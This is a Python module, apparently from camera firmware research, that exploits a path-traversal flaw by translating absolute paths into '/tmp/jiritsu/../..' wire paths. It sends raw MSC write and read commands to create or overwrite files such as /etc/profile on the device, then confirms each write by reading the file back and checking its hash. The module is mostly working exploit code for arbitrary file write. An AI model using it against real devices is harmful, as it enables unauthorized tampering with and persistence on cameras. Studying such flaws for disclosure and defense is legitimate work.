"""Write arbitrary camera files through the MSC-layer writer, with read-back verification.

This is the layer that demonstrably works on this camera: the vendor's `FileControl`
(pFunc 0xFF01) answers 128 for every path, while the MSC commands 0x0f/0x10/0x11 read
and write real files — they created /etc/a7c2-write-check.bin from nothing.

What the firmware does *not* do is extend an existing file: writing 512 or 72 bytes into
a 0-byte file failed with 0x10000009, while writing 256 bytes into an existing 256-byte
file verified byte-for-byte. Creation and same-size overwrite work; growth does not. The
module therefore reports the file's size before and after instead of assuming either way.

Paths are given as camera-absolute (`/etc/profile`) and translated to the wire form the
resolver uses (`/tmp/jiritsu/../../etc/profile`).
"""
import hashlib
import struct

from jiritsu_version_read import AUTHORIZED_MAX_BYTES, authorize, exchange

WIRE_ROOT = "/tmp/jiritsu/../.."


def wire_path(camera_path):
    """Translate a camera-absolute path into the form the firmware resolves."""
    if not camera_path.startswith("/"):
        raise ValueError(f"camera path must be absolute, got {camera_path!r}")
    if ".." in camera_path.split("/"):
        raise ValueError(f"camera path must not contain '..': {camera_path!r}")
    return f"{WIRE_ROOT}{camera_path}"


def build_requests(camera_path, payload):
    if not isinstance(payload, bytes) or not payload:
        raise ValueError("payload must be non-empty bytes")
    wire = wire_path(camera_path)
    return {
        "select": struct.pack("<HH", 0x1001, 0x0F) + b"\0" + wire.encode("ascii") + b"\0",
        "write": struct.pack("<HH", 0x1001, 0x10) + bytes([0x00, 0xFF, 0x00]) + payload,
        "read": struct.pack("<HH", 0x1001, 0x11) + bytes([0x00, 0xFF, 0x00]),
    }


def write_file_verified(transport, camera_path, payload, log, verify=True):
    """Write one file and (by default) prove the bytes by reading them back."""
    requests = build_requests(camera_path, payload)
    authorize(transport, tuple(requests.values()), max_bytes=AUTHORIZED_MAX_BYTES,
              max_requests=len(requests))

    expected = hashlib.sha256(payload).hexdigest()
    result = {"path": camera_path, "wire_path": wire_path(camera_path),
              "bytes": len(payload), "sha256": expected}

    # A refusal is a result, not an exception: "the firmware will not extend this file"
    # is exactly what the caller needs to read (0x10000009 on a 0-byte target).
    try:
        exchange(transport, requests["select"], 4, log)
        exchange(transport, requests["write"], 4, log)
    except Exception as error:                            # noqa: BLE001
        result.update({"written": False, "error": str(error)[:120], "verified": False})
        log("write_file_failed", path=camera_path, reason=result["error"])
        return result
    log("write_file_written", path=camera_path, wire_path=result["wire_path"],
        bytes=len(payload), sha256=expected)

    if not verify:
        result.update({"written": True, "verified": None})
        return result

    try:
        exchange(transport, requests["select"], 4, log)
        readback = exchange(transport, requests["read"], 4 + AUTHORIZED_MAX_BYTES, log)
    except Exception as error:                            # noqa: BLE001
        result.update({"written": True, "verified": False,
                       "readback_error": str(error)[:120]})
        log("write_file_readback_failed", path=camera_path, reason=result["readback_error"])
        return result

    actual = hashlib.sha256(readback).hexdigest()
    log("write_file_readback", path=camera_path, readback_bytes=len(readback),
        readback_sha256=actual, matches=(actual == expected))
    result.update({"written": True, "readback_bytes": len(readback),
                   "readback_sha256": actual, "verified": actual == expected})
    return result
